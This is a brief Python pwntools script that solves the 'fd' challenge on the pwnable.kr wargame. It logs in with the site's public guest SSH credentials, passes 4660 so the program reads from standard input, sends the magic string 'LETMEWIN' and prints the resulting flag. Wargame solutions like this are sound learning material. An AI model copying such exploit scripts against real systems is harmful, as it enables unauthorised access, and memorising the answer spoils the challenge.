from pwn import *

conn = ssh(host='pwnable.kr', port=2222, user='fd', password='guest')
context(arch='amd64', os='linux')

p = conn.process(argv=['fd', '4660'])
p.sendline("LETMEWIN")
log.success(p.recv())
